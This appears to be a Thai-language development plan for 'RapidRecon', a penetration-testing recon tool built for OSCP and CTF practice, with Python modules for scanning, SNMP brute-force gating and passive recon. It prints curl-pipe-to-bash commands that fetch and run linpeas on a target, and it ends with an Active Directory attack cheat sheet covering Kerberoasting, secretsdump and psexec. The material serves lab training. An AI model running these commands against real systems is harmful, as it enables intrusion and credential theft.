# RapidRecon — Tier 1/2/3 Development Guidebook (v1.0)
## ต่อยอดจาก Core Engine (Week 1-4) + Web Dashboard (Week 6-7)

> อ้างอิงลำดับที่ยืนยันไว้แล้ว: **Core (W1-4) → Tier 1 (W5) → Dashboard (W6-7) → Tier 2 (เมื่อมีเวลา)**
> Tier 3 **ไม่ใช่ code** — เป็นเอกสาร manual reference เท่านั้น ห้ามเขียนเป็น automated subcommand โดยเด็ดขาด

---

# ส่วนที่ 1: TIER 1 — Safety & Convenience Features (Week 5)

เป้าหมาย: เพิ่ม safety mechanism ที่ทำให้ tool ปลอดภัยขึ้นจริง + helper เล็กๆ ที่ cost ต่ำ value สูง ทั้งหมดนี้ทำเสร็จได้ใน 1 สัปดาห์

## 1.1 `requires_flag` Mechanism

### โครงสร้างไฟล์ที่เพิ่ม
```
rapidrecon/
├── core/
│   └── rule_engine.py        # แก้ไข — เพิ่ม flag checking logic
├── cli.py                     # แก้ไข — เพิ่ม --allow-* flags
```

### แก้ `config/default.yaml` — เพิ่ม field `requires_flag` ในทุก trigger ที่เป็น intrusive
```yaml
triggers:
  - match:
      port: 161
      service: "snmp"
    plugins: ["snmp_plugin"]
    actions:
      - name: snmpwalk_public
        requires_flag: null              # public community string = safe, ไม่ต้อง flag
      - name: onesixtyone_bruteforce
        requires_flag: "allow_bruteforce" # brute-force community string = ต้อง flag
```

### `core/rule_engine.py` — เพิ่ม method ตรวจ flag
```python
from dataclasses import dataclass, field

@dataclass
class ActionResult:
    name: str
    executed: bool
    skip_reason: str | None = None

class RuleEngine:
    def __init__(self, rules: list[dict], enabled_flags: set[str]):
        self.rules = rules
        self.enabled_flags = enabled_flags   # เช่น {"allow_bruteforce", "allow_ad_attacks"}

    def resolve_actions(self, rule: dict) -> list[ActionResult]:
        results = []
        for action in rule.get("actions", [{"name": rule.get("name"), "requires_flag": rule.get("requires_flag")}]):
            needed = action.get("requires_flag")
            if needed and needed not in self.enabled_flags:
                results.append(ActionResult(name=action["name"], executed=False,
                                             skip_reason=f"requires --{needed.replace('_','-')}"))
                continue
            results.append(ActionResult(name=action["name"], executed=True))
        return results
```

### `cli.py` — เพิ่ม flag ใน argparse
```python
parser.add_argument("--allow-bruteforce", action="store_true", dest="allow_bruteforce")
parser.add_argument("--allow-intrusive", action="store_true", dest="allow_intrusive")
# รวบเป็น enabled_flags set ก่อนส่งเข้า RuleEngine
enabled_flags = {f for f, v in vars(args).items() if f.startswith("allow_") and v}
```

**จุดสำคัญ:** ทุก `ActionResult` ที่ `executed=False` ต้องถูกบันทึกลง `report.json` ในฟิลด์ `skipped_actions` เสมอ (ไม่ใช่แค่ log console) เพื่อให้ผู้ใช้เห็นตอนเปิด dashboard ทีหลังว่ามี attack surface ที่ยังไม่ได้ลอง

```json
"skipped_actions": [
  {"port": 161, "action": "onesixtyone_bruteforce", "reason": "requires --allow-bruteforce"}
]
```

---

## 1.2 Vuln Scan Module + Confirmation Prompt

### โครงสร้างไฟล์ใหม่
```
rapidrecon/
├── vulnscan/
│   ├── __init__.py
│   ├── nuclei_wrapper.py
│   ├── nse_vulners_wrapper.py
│   └── vulnscan_report.py
```

### `vulnscan/nuclei_wrapper.py`
```python
import subprocess
from pathlib import Path

# เฉพาะ template ที่เป็น detection-only ปลอดภัยสำหรับใช้ในสนามสอบ
# หลีกเลี่ยง tag ที่มี PoC exploitation จริง (เช่น "rce" แบบ intrusive)
SAFE_TAGS_DEFAULT = "cve,exposure,misconfig,default-login"

def build_nuclei_command(target_url: str, outdir: Path, severity: str = "critical,high",
                          tags: str = SAFE_TAGS_DEFAULT, intrusive: bool = False) -> list[str]:
    cmd = ["nuclei", "-u", target_url, "-severity", severity, "-silent",
           "-o", str(outdir / "nuclei.txt"), "-jsonl", "-oj", str(outdir / "nuclei.jsonl")]
    if not intrusive:
        cmd += ["-tags", tags]
    return cmd
```

**หมายเหตุสำคัญด้าน exam compliance:** ตาม OSCP exam guide วัตถุประสงค์หลักคือประเมินทักษะการหาและใช้ช่องโหว่ ไม่ใช่ automation ดังนั้น**ค่า default ต้องจำกัดเฉพาะ tag ที่เป็น detection-only เท่านั้น** ห้าม default ไปที่ template กลุ่มที่มี exploitation PoC ฝังอยู่ ต้องเปิดด้วย `--intrusive` explicit เท่านั้น (เหมือนหลักการเดียวกับ `requires_flag`)

### `cli.py` — เพิ่ม subcommand `vulnscan` พร้อม confirmation
```python
def cmd_vulnscan(args):
    if not args.dry_run:
        print(f"[!] กำลังจะรัน vuln scan กับ {args.target}")
        print(f"[!] Severity: {args.severity} | Intrusive: {args.intrusive}")
        confirm = input("ยืนยันการรัน? (yes/no): ").strip().lower()
        if confirm != "yes":
            print("[*] ยกเลิกการทำงาน")
            return
    # ... เรียก nuclei_wrapper.build_nuclei_command แล้ว subprocess.run
```

---

## 1.3 Packet Capture Helper

### ไฟล์ใหม่
```
rapidrecon/
├── utils/
│   └── capture.py
```

```python
import subprocess
from pathlib import Path

def start_capture(interface: str, output_path: Path) -> subprocess.Popen:
    """เปิด tcpdump แบบ background process คู่กับ scan หลัก"""
    cmd = ["tcpdump", "-i", interface, "-s", "0", "-w", str(output_path)]
    return subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def stop_capture(proc: subprocess.Popen):
    proc.terminate()
    proc.wait(timeout=5)
```

### CLI usage
```bash
rapidrecon scan 10.10.10.5 --with-capture --iface eth0
# หรือรันแยกเดี่ยว
rapidrecon capture --iface eth0 --output dump.pcap
```

**Integration point:** ใน `orchestrator.py` เพิ่มบรรทัดเรียก `start_capture()` ก่อนเริ่ม Phase 1 (Quick Scan) และ `stop_capture()` หลัง Phase 4 (Report) จบ — ไฟล์ `.pcap` เก็บไว้ใน output directory เดียวกับผลลัพธ์อื่น

---

## 1.4 Post-Exploitation Helper (Serve Only)

### ไฟล์ใหม่
```
rapidrecon/
├── postexploit/
│   ├── __init__.py
│   ├── linpeas_helper.py
│   └── winpeas_helper.py
```

```python
# postexploit/linpeas_helper.py
import http.server
import socketserver
import socket
from pathlib import Path

def get_local_ip() -> str:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()
    return ip

def serve_linpeas(tools_dir: Path, port: int = 8000):
    ip = get_local_ip()
    print(f"[*] Serving from {tools_dir} at http://{ip}:{port}/")
    print(f"[*] รันบน target (Linux):")
    print(f"    curl http://{ip}:{port}/linpeas.sh | bash")
    print(f"    wget http://{ip}:{port}/linpeas.sh -O /tmp/linpeas.sh && bash /tmp/linpeas.sh")

    handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", port), handler) as httpd:
        import os
        os.chdir(tools_dir)
        httpd.serve_forever()
```

### CLI usage
```bash
rapidrecon postexploit --os linux --serve --port 8000
rapidrecon postexploit --os windows --serve --port 8000
```

**หลักการย้ำอีกครั้ง:** โมดูลนี้ **ไม่มี logic ตัดสินใจว่าจะ deliver ยังไง** (ไม่รู้ว่า target มี curl/wget/no-internet) เพราะแต่ละสถานการณ์ต่างกันทุกครั้ง — ผู้ใช้ต้องเลือกวิธี transfer เองบนหน้างานจริง เครื่องมือช่วยแค่ "ลดเวลา setup server + จำ path/IP"

---

## 1.5 Burp Scope Export

### ไฟล์ใหม่
```
rapidrecon/
├── output/
│   └── burp_export.py
```

```python
from pathlib import Path
from rapidrecon.core.models import Target

def export_burp_scope(targets: list[Target], outpath: Path):
    urls = set()
    for t in targets:
        for port in t.ports:
            if port.service and any(s in port.service.lower() for s in ("http", "https")):
                scheme = "https" if "https" in port.service.lower() or port.number in (443, 8443) else "http"
                urls.add(f"{scheme}://{t.host}:{port.number}")
    outpath.write_text("\n".join(sorted(urls)))
    print(f"[+] Exported {len(urls)} URL(s) to {outpath}")
```

### CLI usage
```bash
rapidrecon export-burp-scope --input ./output/10.10.10.5/ --output burp_targets.txt
```

---

## 1.6 อัปเดต `report.json` Schema (รวม Tier 1 ทั้งหมด)

```json
{
  "target": "10.10.10.5",
  "scan_started": "2026-08-01T10:00:00",
  "scan_duration_seconds": 320,
  "open_ports": [ ... ],
  "findings": [ ... ],
  "skipped_actions": [
    {"port": 161, "action": "onesixtyone_bruteforce", "reason": "requires --allow-bruteforce"}
  ],
  "vulnscan": {
    "executed": true,
    "severity_filter": "critical,high",
    "intrusive_mode": false,
    "results_file": "nuclei.jsonl"
  },
  "capture_file": "dump.pcap",
  "burp_scope_exported": "burp_targets.txt",
  "raw_output_files": { ... }
}
```

**เหตุผลที่ต้องทำ schema นี้ให้เสร็จก่อนเริ่ม Dashboard:** ถ้า schema เปลี่ยนหลัง Dashboard สร้างไปแล้ว ต้องแก้ frontend ซ้ำ — ตามลำดับที่ยืนยันไว้ (Tier 1 → Dashboard) schema ต้องนิ่งก่อนเริ่ม Week 6

---

## 1.7 Roadmap Week 5 แบบละเอียดวันต่อวัน

| วัน | งาน |
|---|---|
| 1 | `requires_flag` mechanism ใน RuleEngine + แก้ `default.yaml` ใส่ flag ทุก intrusive trigger |
| 2 | Vuln scan module (`nuclei_wrapper.py`) + confirmation prompt + safe-tag default |
| 3 | Packet capture helper + integration กับ orchestrator (`--with-capture`) |
| 4 | Post-exploit helper (linpeas/winpeas serve) |
| 5 | Burp scope export + อัปเดต `report.json` schema ให้ครบทุกฟิลด์ใหม่ |
| 6-7 | ทดสอบทั้งหมดกับ target จริง 1-2 ตัว (HTB/VulnHub) วนดู edge case, เขียน unit test สำหรับ `resolve_actions()` |

---

# ส่วนที่ 2: TIER 2 — Passive Recon + Extra Plugins (ทำเมื่อมีเวลาว่าง)

> ไม่ผูก deadline ตายตัว แต่ให้โครงสร้างไว้ล่วงหน้าเพื่อไม่ต้อง design ใหม่ตอนอยากทำ

## 2.1 Passive Recon Module

### โครงสร้างไฟล์
```
rapidrecon/
├── passive/
│   ├── __init__.py
│   ├── dns_recon.py
│   ├── whois_lookup.py
│   ├── crtsh_lookup.py
│   ├── subfinder_wrapper.py
│   ├── amass_wrapper.py
│   ├── assetfinder_wrapper.py
│   └── passive_report.py
```

### `passive/crtsh_lookup.py` — ฝึก HTTP client + JSON parsing เอง
```python
import urllib.request
import json

def query_crtsh(domain: str) -> list[str]:
    url = f"https://crt.sh/?q=%25.{domain}&output=json"
    req = urllib.request.Request(url, headers={"User-Agent": "rapidrecon/1.0"})
    with urllib.request.urlopen(req, timeout=15) as resp:
        data = json.loads(resp.read().decode())
    names = set()
    for entry in data:
        for name in entry.get("name_value", "").split("\n"):
            names.add(name.strip())
    return sorted(names)
```

### `passive/passive_report.py` — merge logic (concept เดิมที่คุยไว้)
```python
def merge_subdomains(*sources: list[str]) -> set[str]:
    normalized = set()
    for source in sources:
        for entry in source:
            clean = entry.strip().lower().lstrip("*.").rstrip(".")
            if clean:
                normalized.add(clean)
    return normalized

def write_passive_report(domain: str, merged: set[str], outpath):
    lines = [f"# Passive Recon Report — {domain}", "", f"## Subdomains ({len(merged)})", ""]
    lines += sorted(merged)
    outpath.write_text("\n".join(lines))
```

### CLI usage
```bash
rapidrecon passive example.com --output ./results
# → สร้าง passive_report.md + subdomains_merged.txt
# → สามารถส่งต่อไฟล์นี้เข้า httpx เพื่อเช็ค alive host: httpx -l subdomains_merged.txt
```

**จุดเชื่อมกับ Active pipeline:** เพิ่ม flag `--chain-to-active` ที่รับ `subdomains_merged.txt` แล้วเรียก `httpx` อัตโนมัติต่อ (manual trigger ไม่ auto-scan ทันที ต้องกดยืนยันเหมือน vuln scan)

---

## 2.2 RPC Plugin

### ไฟล์ใหม่ `plugins/rpc_plugin.py`
```python
class RPCPlugin(ScanPlugin):
    name = "rpc_plugin"
    required_binaries = ["rpcclient", "impacket-rpcdump"]

    def run(self, target, port, output_dir, context):
        commands = [
            (["rpcclient", "-U", "", "-N", target, "-c", "enumdomusers;querydispinfo"],
             output_dir / "rpcclient.txt"),
            (["impacket-rpcdump", target], output_dir / "rpcdump.txt"),
        ]
        findings = []
        for cmd, outfile in commands:
            result = subprocess.run(cmd, capture_output=True, timeout=120, text=True)
            outfile.write_text(result.stdout)
            if "NT_STATUS_ACCESS_DENIED" not in result.stdout and result.stdout.strip():
                findings.append(Finding(severity="notable", title="RPC anonymous enum succeeded",
                                         detail=f"See {outfile.name}"))
        return PluginResult(plugin_name=self.name, port=port, success=True, findings=findings,
                             output_files=[f for _, f in commands])
```

## 2.3 SNMP Plugin (บังคับใช้ `requires_flag` กับส่วน brute)

```python
class SNMPPlugin(ScanPlugin):
    name = "snmp_plugin"
    required_binaries = ["snmpwalk", "onesixtyone"]

    def run(self, target, port, output_dir, context):
        findings = []
        # public community string check — safe, ไม่ต้อง flag
        result = subprocess.run(["snmpwalk", "-v2c", "-c", "public", target],
                                 capture_output=True, timeout=60, text=True)
        (output_dir / "snmpwalk.txt").write_text(result.stdout)
        if result.returncode == 0 and result.stdout.strip():
            findings.append(Finding(severity="critical", title="SNMP public community string works",
                                     detail="ดู snmpwalk.txt"))

        # brute-force community string — ต้องผ่าน requires_flag เท่านั้น (เช็คจาก context)
        if context.get("allow_bruteforce"):
            result = subprocess.run(["onesixtyone", target, "-c", "community_strings.txt"],
                                     capture_output=True, timeout=180, text=True)
            (output_dir / "onesixtyone.txt").write_text(result.stdout)

        return PluginResult(plugin_name=self.name, port=port, success=True, findings=findings,
                             output_files=[output_dir / "snmpwalk.txt"])
```

## 2.4 Roadmap Tier 2 (แบบยืดหยุ่น ไม่ผูก week)

| งาน | เวลาประมาณ | Priority |
|---|---|---|
| Passive Recon module เต็ม | 4-5 วัน | สูง (value/cost ดีที่สุดใน Tier 2) |
| RPC plugin | 1 วัน | ปานกลาง |
| SNMP plugin | 1 วัน | ปานกลาง |
| WordPress plugin (wpscan wrapper) | 0.5 วัน | ต่ำ (ใช้ wpscan ตรงๆ ตอนเจอเองก็พอ ไม่จำเป็นต้อง automate) |

---

# ส่วนที่ 3: TIER 3 — Manual AD Attack Reference (ไม่มี Code)

> **กฎเหล็ก: ห้ามเขียน subcommand ใดๆ ที่ automate ส่วนนี้** เก็บเป็นไฟล์ `docs/ad-attack-reference.md` ในตัว repo เพื่อเปิดอ่านเร็วตอนสอบ/CTF แต่ต้องพิมพ์คำสั่งเองทุกครั้ง

## เนื้อหาที่ควรอยู่ใน `docs/ad-attack-reference.md`

```markdown
# AD Attack Chain — Manual Reference (พิมพ์เองทุกครั้ง ห้าม script loop)

## Phase 1: Initial Enumeration
- ldapsearch -x -H ldap://<dc-ip> -s base
- rpcclient -U "" -N <dc-ip> -c "enumdomusers"
- nxc smb <dc-ip> -u '' -p '' --shares
- nxc smb <dc-ip> -u '' -p '' --users

## Phase 2: Kerberos Abuse (ทำทีละคำสั่ง อ่านผลก่อนไปต่อ)
- impacket-GetNPUsers <domain>/ -usersfile users.txt -no-pass -dc-ip <dc-ip>
  → ได้ hash แล้วเอาไป crack ด้วย hashcat -m 18200 เอง
- impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc-ip> -request
  → Kerberoasting, crack ด้วย hashcat -m 13100

## Phase 3: BloodHound (เก็บข้อมูล → วิเคราะห์ด้วยตาเอง)
- bloodhound-python -u <user> -p <pass> -d <domain> -c All -ns <dc-ip>
- เปิด BloodHound GUI → import JSON → วิเคราะห์ attack path เอง
  (ห้าม script อ่าน BloodHound JSON แล้วเลือก path ให้อัตโนมัติ — 
   นี่คือทักษะหลักที่สอบวัด ต้องฝึกอ่านกราฟเอง)

## Phase 4: Credential Validation (ทำทีละ protocol ไม่ loop)
- nxc smb <dc-ip> -u <user> -p <pass>
- nxc winrm <dc-ip> -u <user> -p <pass>
- nxc ldap <dc-ip> -u <user> -p <pass>

## Phase 5: Post-Auth (ทำเมื่อมั่นใจแล้วว่าต้องใช้ทางไหน)
- impacket-secretsdump <domain>/<user>:<pass>@<dc-ip>
- impacket-psexec <domain>/<user>:<pass>@<target>
- impacket-wmiexec <domain>/<user>:<pass>@<target>
```

## ทำไมต้องคงไว้แบบ manual เท่านั้น (ย้ำเหตุผลสั้นๆ)

1. **OSCP วัดการตัดสินใจ ไม่ใช่ automation** — การ script ให้ loop ทุก protocol/รันทุก phase อัตโนมัติขัดกับวัตถุประสงค์หลักของข้อสอบโดยตรง
2. **AD environment แต่ละที่ต่างกันมาก** — edge case (domain trust, delegation, RBCD) ทำให้ automation ทั่วไปพังบ่อย การพิมพ์เองทำให้ปรับตามสถานการณ์ได้ทันที
3. **Credential security** — ถ้าเขียนเป็น subcommand ที่รับ `--pass` จะกลับไปเจอปัญหา credential-in-argv ที่เคยเตือนไว้ การพิมพ์ manual ทีละคำสั่งหลีกเลี่ยงปัญหานี้โดยธรรมชาติ (ยกเว้นต้องระวัง shell history เองอยู่ดี ใช้ `HISTCONTROL=ignorespace` เติม space หน้าคำสั่งที่มี password ได้)

---

# สรุปภาพรวมทั้งหมด

```
Week 1-4  → Core Engine (5 plugin) ✅ ต้องเสร็จก่อนเสมอ
Week 5    → Tier 1 (safety features: requires_flag, vulnscan+confirm, 
                     capture, post-exploit helper, burp export)
Week 6-7  → Web Dashboard (อ่าน report.json ที่ schema นิ่งแล้วจาก Tier 1)
ทำเมื่อว่าง → Tier 2 (passive recon, RPC/SNMP plugin)
ตลอดไป    → Tier 3 = docs/ad-attack-reference.md อย่างเดียว ไม่มี code
```

โปรเจกต์ทั้งหมดนี้ให้ทั้ง engine ที่ใช้สอบได้จริง, safety design ที่ดี, dashboard สำหรับโชว์พอร์ต, และ reference document ที่แสดงว่าคุณเข้าใจ trade-off ของ automation vs manual skill — ครบทุกเป้าหมายที่ตั้งไว้ตั้งแต่ต้นโดยไม่บาน scope จนเสี่ยงไม่จบ
